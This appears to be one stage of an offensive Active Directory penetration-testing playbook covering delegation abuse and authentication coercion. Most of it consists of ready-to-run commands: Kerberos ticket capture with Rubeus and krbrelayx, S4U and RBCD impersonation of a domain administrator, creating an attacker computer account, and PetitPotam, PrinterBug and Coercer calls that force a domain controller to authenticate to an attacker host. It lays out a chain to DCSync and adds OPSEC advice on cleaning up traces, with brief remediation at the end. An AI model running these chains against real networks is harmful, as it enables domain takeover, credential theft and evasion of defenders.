# Stage 5 — Delegation Abuse & Authentication Coercion

## Find delegation
```bash
nxc ldap <DC> -u user -p pass --trusted-for-delegation   # unconstrained
findDelegation.py corp.local/user:pass -dc-ip <DC>       # all types
# BloodHound flags AllowedToDelegate / unconstrained / RBCD edges.
```

## Unconstrained delegation
A host with unconstrained delegation caches the TGT of anyone who authenticates
to it. Compromise such a host, then **coerce a DC** to authenticate to it → capture
the DC's TGT → DCSync.
```bash
# On the unconstrained host (Windows): monitor for tickets
Rubeus.exe monitor /interval:5 /nowrap
# From Linux, use krbrelayx to capture:
krbrelayx.py -t ldaps://<DC> --dump      # while coercing the DC
# then coerce (below) -> DC TGT -> s4u/DCSync
```

## Constrained delegation (S4U)
An account configured with `msDS-AllowedToDelegateTo` can impersonate users to the
listed services. Compromise it → impersonate DA to that service:
```bash
getST.py -spn cifs/target.corp.local -impersonate administrator \
  corp.local/svc_web -hashes :<nthash>
export KRB5CCNAME=administrator.ccache
nxc smb target.corp.local -k --use-kcache
```
Protocol transition ("any auth protocol") makes it worse; even without it, S4U2self
+ S4U2proxy chains work. SPN substitution can widen the reachable service.

## Resource-Based Constrained Delegation (RBCD)
If you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer
(via GenericAll/GenericWrite from acl-and-object-abuse.md, or a relay), you can
impersonate anyone to that host.
```bash
# 1) get a controllable computer account (create one if MachineAccountQuota>0)
addcomputer.py corp.local/user:pass -computer-name ATTACKER$ -computer-pass 'Pass123!'
# 2) configure RBCD on the target
rbcd.py -delegate-to 'TARGET$' -from 'ATTACKER$' -action write corp.local/user:pass
# 3) impersonate DA to the target
getST.py -spn cifs/target.corp.local -impersonate administrator \
  corp.local/ATTACKER$:'Pass123!'
```
RBCD is the standard payoff for `ntlmrelayx --delegate-access` (relay to LDAPS).

## Coercion (force a machine/DC to authenticate to you)
Combine with relay (initial-access.md), unconstrained delegation, or ADCS ESC8.
```bash
# PetitPotam (MS-EFSRPC) — often unauth
petitpotam.py -d corp.local -u user -p pass <ATTACKER_IP> <DC_IP>
# PrinterBug / SpoolSample (MS-RPRN spooler)
printerbug.py corp.local/user:pass@<TARGET> <ATTACKER_IP>
# DFSCoerce (MS-DFSNM), ShadowCoerce (MS-FSRVP), or all-in-one:
coercer coerce -u user -p pass -t <TARGET> -l <ATTACKER_IP> -d corp.local
```
Classic full chain: **PetitPotam → relay to ADCS ESC8 → DC certificate → PKINIT →
DCSync** (no cracking, no user interaction).

## OPSEC
Coercion generates auth events from the DC to your host; relay/delegation changes
are logged (RBCD attribute write = 5136). Remove the computer account and RBCD
attribute you added; keep windows short.

## Remediation to recommend
Avoid unconstrained delegation (use RBCD/constrained, mark sensitive accounts
"Account is sensitive and cannot be delegated" / Protected Users); set
MachineAccountQuota to 0; patch + disable Spooler/EFSRPC where possible; enforce
SMB/LDAP signing + EPA (blocks relay); monitor writes to
`msDS-AllowedToActOnBehalfOfOtherIdentity`.
